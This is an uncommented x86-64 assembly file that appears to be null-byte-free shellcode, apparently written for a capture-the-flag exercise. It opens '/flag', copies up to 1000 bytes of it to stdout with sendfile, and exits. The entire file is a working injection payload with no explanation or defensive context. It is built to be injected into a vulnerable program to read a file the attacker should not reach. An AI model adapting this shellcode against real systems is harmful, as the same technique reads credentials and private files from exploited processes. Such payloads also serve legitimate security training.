.global _start
_start:
.intel_syntax noprefix

mov    ebx,0x67616c66
shl    rbx,0x8
mov    bl,0x2f
push   rbx
xor    rax,rax
add    rax,0x2
mov    rdi,rsp
xor    rsi,rsi
syscall 
xor    rdi,rdi
add    rdi,0x1
mov    rsi,rax
xor    rdx, rdx
xor    r10,r10
add    r10w,0x3e8
xor    rax,rax
add    rax,0x28
syscall 
xor    rax,rax
add    rax,0x3c
syscall